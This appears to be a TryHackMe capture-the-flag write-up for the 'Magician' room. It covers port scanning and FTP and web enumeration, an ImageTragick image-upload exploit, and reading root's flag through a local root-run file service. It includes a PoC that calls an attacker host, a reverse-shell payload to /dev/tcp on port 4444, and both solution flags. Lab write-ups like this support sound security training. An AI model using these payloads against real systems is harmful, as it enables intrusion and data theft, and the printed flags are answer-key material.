---
tags:
  - tryhackme
  - challenge
  - easy
  - offensive
  - linux
  - vulnerability-exploitation
  - system-misconfiguration
---

# Magician
![Magician logo](logos/magician_logo.png)

**Platform:** TryHackMe  
**Type:** Challenge  
**Difficulty:** Easy  
**Link:** [Magician](https://tryhackme.com/room/magician)  

## Description
"This magical website lets you convert image file formats

Please add the IP address of this machine with the hostname "magician" to your /etc/hosts file on Linux before you start.
On Windows, the hosts file should be at C:\Windows\System32\drivers\etc\hosts.

Use the hostname instead of the IP address if you want to upload a file. This is required for the room to work correctly ;)

Have fun and use your magic skills!"

## Enumeration
### Port Scanning
```
ports=$(nmap -p- --min-rate=1000 TARGET_IP_ADDRESS | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -A -T4 TARGET_IP_ADDRESS
```

```
Host is up (0.020s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
8080/tcp open  http    Apache Tomcat (language: en)
|_http-title: Site doesn't have a title (application/json).
8081/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: magician
|_http-server-header: nginx/1.14.0 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone
Running (JUST GUESSING): Linux 5.X|6.X|4.X (96%), Google Android 10.X|11.X|12.X (93%)
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:6 cpe:/o:linux:linux_kernel:4 cpe:/o:google:android:10 cpe:/o:google:android:11 cpe:/o:google:android:12 cpe:/o:linux:linux_kernel:5.4
Aggressive OS guesses: Linux 5.14 - 6.8 (96%), Linux 4.15 - 5.19 (96%), Linux 5.4 - 5.15 (96%), Linux 4.15 (95%), Android 10 - 12 (Linux 4.14 - 4.19) (93%), Android 10 - 11 (Linux 4.9 - 4.14) (92%), Android 12 (Linux 5.4) (92%), Android 9 - 11 (Linux 4.9 - 4.14) (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### FTP Enumeration
```
ftp 10.130.160.89                                                                                                                           
Connected to 10.130.160.89.
220 THE MAGIC DOOR
Name (10.130.160.89:kali): ftp # Same result with "anonymous" login
331 Please specify the password.
Password: 
230-Huh? The door just opens after some time? You're quite the patient one, aren't ya, it's a thing called 'delay_successful_login' in /etc/vsftpd.conf ;) Since you're a rookie, this might help you to get started: https://imagetragick.com. You might need to do some little tweaks though...
230 Login successful.
ftp> dir
550 Permission denied.
```

### HTTP Enumeration (port 8080)
```
ffuf -u http://TARGET_IP_ADDRESS:8080/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -c
gobuster dir -u http://TARGET_IP_ADDRESS:8081 -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,txt
```

**Notes**  

* Navigating to web page in a browser results in a "secure connection failed" message  
* Using hostname provided ("magician") with specified port results in a `404` error  
* No `robots.txt` or `sitemap` files  
* `ffuf` scan reveals two directories of interest: `/files` and `/upload`  
* `/files` page results in an empty page being returned in raw data  
* `/upload` page results in a `405` error  

### HTTP enumeration (port 8081)
```
ffuf -u http://TARGET_IP_ADDRESS:8081/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -c
gobuster dir -u http://TARGET_IP_ADDRESS:8081 -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,txt
```

**Notes**  

* Navigating to web page in a browser results in a "secure connection failed" message  
* Using hostname provided ("magician") with specified port reveals a PNG to JPG converter portal  
* No `robots.txt` or `sitemap` files  
* Nothing interesting in source code  
* `ffuf` scan reveals `/img`, `/css`, and `/js` directories - all result in a `403` error

### Vulnerability Enumeration
```
searchsploit vsftpd 2.0.8	# No results
searchsploit nginx 1.14.0	# No results
```

## Foothold
[ImageTragick](https://imagetragick.com/) (this provided by FTP enumeration)

### POC

```
nano poc.png

# File contents
push graphic-context
viewbox 0 0 640 480
fill 'url(http://ATTACKER_IP_ADDRESS:8000/test.txt)'
pop graphic-context

touch test.txt
python3 -m http.server

# Upload poc.png to web server and convert
```

**Notes**  

* Web server on attacker machine shows successful connection to `GET` "test.txt"  
*Exploit viability confirmed*

### Exploitation
[ImageTragick payloads](https://techbrunch.github.io/patt-mkdocs/Upload%20Insecure%20Files/Picture%20Image%20Magik/)
```
nano exploit.png

# File contents
push graphic-context
encoding "UTF-8"
viewbox 0 0 1 1
affine 1 0 0 1 0 0
push graphic-context
image Over 0,0 1,1 '|/bin/sh -i > /dev/tcp/ATTACKER_IP_ADDRESS/4444 0<&1 2>&1'
pop graphic-context
pop graphic-context

nc -lvnp 4444

# Upload exploit.png to web server and convert

Listening on 0.0.0.0 4444
Connection received on 10.130.160.89 44756
sh: cannot set terminal process group (1495): Inappropriate ioctl for device
sh: no job control in this shell

sh-4.4$ python3 -c 'import pty; pty.spawn("/bin/bash")'

magician@magician:/tmp/hsperfdata_magician$ ls -al /home
total 12
drwxr-xr-x  3 root     root     4096 Jan 30  2021 .
drwxr-xr-x 24 root     root     4096 Jan 30  2021 ..
drwxr-xr-x  5 magician magician 4096 Feb 13  2021 magician

magician@magician:/tmp/hsperfdata_magician$ ls -al /home/magician
total 17204
drwxr-xr-x 5 magician magician     4096 Feb 13  2021 .
drwxr-xr-x 3 root     root         4096 Jan 30  2021 ..
lrwxrwxrwx 1 magician magician        9 Feb  6  2021 .bash_history -> /dev/null
-rw-r--r-- 1 magician magician      220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 magician magician     3771 Apr  4  2018 .bashrc
drwx------ 2 magician magician     4096 Jan 30  2021 .cache
drwx------ 3 magician magician     4096 Jan 30  2021 .gnupg
-rw-r--r-- 1 magician magician      807 Apr  4  2018 .profile
-rw-r--r-- 1 magician magician        0 Jan 30  2021 .sudo_as_admin_successful
-rw------- 1 magician magician     7546 Jan 31  2021 .viminfo
-rw-r--r-- 1 root     root     17565546 Jan 30  2021 spring-boot-magician-backend-0.0.1-SNAPSHOT.jar
-rw-r--r-- 1 magician magician      170 Feb 13  2021 the_magic_continues
drwxr-xr-x 2 root     root         4096 Feb  5  2021 uploads
-rw-r--r-- 1 magician magician       24 Jan 30  2021 user.txt

magician@magician:/tmp/hsperfdata_magician$ cat /home/magician/user.txt
```
??? success "user.txt"
	THM{simsalabim_hex_hex}

## Privilege Escalation
```
magician@magician:/tmp/hsperfdata_magician$ cat /home/magician/the_magic_continues
The magician is known to keep a locally listening cat up his sleeve, it is said to be an oracle who will tell you secrets if you are good enough to understand its meows.

magician@magician:/tmp/hsperfdata_magician$
root      1070  0.0  1.9  65232 19556 ?        Ss   08:22   0:00 /usr/bin/python3 /usr/local/bin/gunicorn --bind 127.0.0.1:6666 magiccat:app
root      2122  0.0  2.9  83920 28916 ?        S    09:52   0:00 /usr/bin/python3 /usr/local/bin/gunicorn --bind 127.0.0.1:6666 magiccat:app
magician  3187  0.0  0.1  13220  1100 pts/1    S+   10:19   0:00 grep --color=auto cat

magician@magician:/tmp/hsperfdata_magician$ curl http://localhost:6666
```
```
<!DOCTYPE html>
<html>
  <head>
    <title>The Magic cat</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- Bootstrap -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
  </head>
  <body>

<div class="navbar navbar-inverse" role="navigation">
    <div class="container">
        <div class="navbar-header">
            <a class="navbar-brand" href="/">The Magic cat</a>
        </div>
    </div>
</div>


<div class="container">


<form action="" method="post"
  class="form" role="form">







<div class="form-group "><label class="control-label" for="filename">Enter filename</label>

          <input class="form-control" id="filename" name="filename" type="text" value="">

  </div>














    <input class="btn btn-default" id="submit" name="submit" type="submit" value="Submit">






</form>
<div>
```
```
magician@magician:/tmp/hsperfdata_magician$ curl -H "Content-type: application/x-www-form-urlencoded" -d "filename=/root/root.txt" -X POST http://localhost:6666
```
```
<REDACTED FOR BREVITY>
</form>
<div>
    <span>
        <pre class="page-header">
        GUZ{zntvp_znl_znxr_znal_zra_znq}

        
        </pre>
    </span>
</div>
```

**Action(s)**  
:white_check_mark: Use CyberChef ROT13 Brute Force recipe to convert returned filed contents  
??? success "root.txt"
	THM{magic_may_make_many_men_mad}

**Date completed:** 16/05/26  
**Date published:** 16/05/26